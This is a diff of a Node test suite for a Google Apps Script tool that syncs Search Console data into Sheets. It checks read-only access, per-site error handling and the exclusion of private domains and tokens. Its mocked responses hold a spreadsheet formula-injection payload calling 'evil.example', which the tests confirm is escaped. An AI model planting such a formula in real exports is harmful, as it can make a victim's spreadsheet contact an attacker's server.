@@ -5,9 +5,9 @@ import { test } from "node:test";
 
 const source = fs.readFileSync(new URL("./Code.gs", import.meta.url), "utf8");
 const manifest = JSON.parse(fs.readFileSync(new URL("./appsscript.json", import.meta.url), "utf8"));
-const names = ["Properties", "Performance", "Sitemaps", "Queries", "Diagnostics"];
+const names = ["Properties", "Performance", "Sitemaps", "Queries", "Pages", "PageQueries", "URLInspections", "Diagnostics"];
 const headers = {
-  Properties: 4, Performance: 9, Sitemaps: 8, Queries: 9, Diagnostics: 5
+  Properties: 4, Performance: 9, Sitemaps: 8, Queries: 9, Pages: 9, PageQueries: 10, URLInspections: 12, Diagnostics: 5
 };
 
 function setup({ failList = false, failPerformance = "" } = {}) {
@@ -53,13 +53,14 @@ function setup({ failList = false, failPerformance = "" } = {}) {
       fetch(url, opts) {
         requestLog.push({ url, method: opts.method, headers: opts.headers });
         assert.equal(opts.headers.Authorization, "Bearer secret-access-token");
-        assert.ok(url.startsWith("https://www.googleapis.com/webmasters/v3/"));
+        assert.ok(url.startsWith("https://www.googleapis.com/webmasters/v3/") || url === "https://searchconsole.googleapis.com/v1/urlInspection/index:inspect");
         if (url.endsWith("/webmasters/v3/sites")) {
           return failList ? responder({ error: { message: "insufficient permission" } }, 403) : responder({
             siteEntry: [
               {siteUrl:"sc-domain:4species.com",permissionLevel:"siteOwner"},
               {siteUrl:"sc-domain:4planet.org",permissionLevel:"siteOwner"},
-              {siteUrl:"https://unverified.example.com/",permissionLevel:"siteUnverifiedUser"}
+              {siteUrl:"https://unverified.example.com/",permissionLevel:"siteUnverifiedUser"},
+              {siteUrl:"sc-domain:ammkunst.com",permissionLevel:"siteOwner"}
             ]
           });
         }
@@ -67,8 +68,25 @@ function setup({ failList = false, failPerformance = "" } = {}) {
           const site = decodeURIComponent(url.split("/sites/")[1].split("/")[0]);
           if (site === failPerformance) return responder({ error: { message: "permission denied" } }, 403);
           const data = JSON.parse(opts.payload);
-          if (data.dimensions.length) return responder({ rows:[{keys:['=IMPORTXML("https://evil.example","//")'],clicks:1,impressions:20,ctr:.05,position:12}] });
+          if (data.dimensions.join(",") === "page") return responder({rows: [
+            {keys:[site === "sc-domain:4planet.org" ? "https://4planet.org/now" : "https://4species.com/orca"],clicks:1,impressions:50,ctr:.02,position:15},
+            {keys:["https://4planet.org/auth/callback?access_token=secret"],clicks:1,impressions:30,ctr:.02,position:10}
+          ]});
+          if (data.dimensions.join(",") === "page,query") return responder({rows:[
+            {keys:[site === "sc-domain:4planet.org" ? "https://4planet.org/now" : "https://4species.com/orca",'=IMPORTXML("https://evil.example","//")'],clicks:1,impressions:20,ctr:.05,position:12}
+          ]});
+          if (data.dimensions.join(",") === "query") return responder({ rows:[{keys:['=IMPORTXML("https://evil.example","//")'],clicks:1,impressions:20,ctr:.05,position:12}] });
           return responder({rows:[{clicks:3,impressions:628,ctr:.004777,position:23.63}]});
+        }
+        if (url.includes("/v1/urlInspection/index:inspect")) {
+          const payload=JSON.parse(opts.payload);
+          assert.ok(payload.siteUrl === "sc-domain:4planet.org" || payload.siteUrl === "sc-domain:4species.com");
+          assert.ok(!payload.inspectionUrl.includes("?"));
+          return responder({inspectionResult:{indexStatusResult:{
+            verdict:"PASS",coverageState:"Submitted and indexed",lastCrawlTime:"2026-10-19T00:00:00Z",
+            googleCanonical:payload.inspectionUrl,userCanonical:payload.inspectionUrl,
+            pageFetchState:"SUCCESSFUL",robotsTxtState:"ALLOWED",indexingState:"INDEXING_ALLOWED"
+          }}});
         }
         if (url.endsWith("/sitemaps")) return responder({sitemap:[{path:"https://4planet.org/sitemap.xml",errors:"0",warnings:"4"}]});
         throw new Error("Unexpected URL " + url);
@@ -93,9 +111,15 @@ test("Apps Script manifest requests read-only GSC, not write access", () => {
 test("one owner auth discovers all sites dynamically and installs one trigger", () => {
   const o = setup();
   const result = o.mock.setup4PlanetGSC();
-  assert.equal(result.properties, 3);
+  assert.equal(result.discovered, 4);
+  assert.equal(result.properties, 2);
+  assert.equal(result.excluded, 2);
   assert.equal(result.readable, 2);
-  assert.equal(o.tabs.get("Properties").data.filter(x => x.length).length, 3);
+  assert.equal(o.tabs.get("Properties").data.filter(x => x.length).length, 2);
+  assert.equal(o.tabs.get("Pages").data.filter(x=>x.length).length, 2);
+  assert.equal(o.tabs.get("PageQueries").data.filter(x=>x.length).length, 2);
+  assert.equal(o.tabs.get("URLInspections").data.filter(x=>x.length).length, 2);
+  assert.ok(!JSON.stringify([...o.tabs.values()].map(x=>x.data)).includes("ammkunst"));
   assert.equal(o.tabs.get("Performance").data.filter(x => x.length).length, 2);
   assert.equal(o.tabs.get("Sitemaps").data.filter(x => x.length).length, 2);
   assert.equal(o.tabs.get("Queries").data.filter(x => x.length).length, 2);
@@ -122,9 +146,30 @@ test("failed property listing does not erase previous Sheets snapshot or create 
 test("one property failing does not break other properties or export OAuth token", () => {
   const o=setup({failPerformance:"sc-domain:4planet.org"});
   const report=o.mock.sync4PlanetGSC();
-  assert.equal(report.properties,3);
+  assert.equal(report.properties,2);
   assert.ok(o.tabs.get("Performance").data.some(r=>r[0]==="sc-domain:4planet.org"&&r[7]==="ERROR"));
   assert.ok(o.tabs.get("Performance").data.some(r=>r[0]==="sc-domain:4species.com"&&r[7]==="OK"));
   assert.ok(o.tabs.get("Diagnostics").data.some(r=>r[1]==="sc-domain:4planet.org"&&r[3]==="ERROR"));
   assert.ok(!JSON.stringify([...o.tabs.values()].map(x=>x.data)).includes("secret-access-token"));
+});
+
+
+test("the richer GSC bridge exports a real page-query pair and index verdict, but never a private domain or auth URL", () => {
+  const o = setup(); const r = o.mock.sync4PlanetGSC();
+  assert.equal(r.discovered, 4);
+  assert.equal(r.excluded, 2);
+  assert.equal(r.pageRows, 2);
+  assert.equal(r.pageQueryRows, 2);
+  assert.equal(r.inspectionRows, 2);
+  const rows = JSON.stringify([...o.tabs.values()].map(x => x.data));
+  assert.ok(!rows.includes("ammkunst.com"));
+  assert.ok(!rows.includes("access_token"));
+  assert.ok(!rows.includes("secret-access-token"));
+  assert.equal(o.tabs.get("URLInspections").data[0][2], "PASS");
+  assert.equal(o.tabs.get("PageQueries").data[0][2].startsWith("'="), true);
+});
+
+test("sitemap warning/error counts are surfaced instead of silently labelled OK", () => {
+  const o = setup(); o.mock.sync4PlanetGSC();
+  assert.ok(o.tabs.get("Sitemaps").data.filter(x=>x.length).every(row=>row[6] === "WARNINGS"));
 });
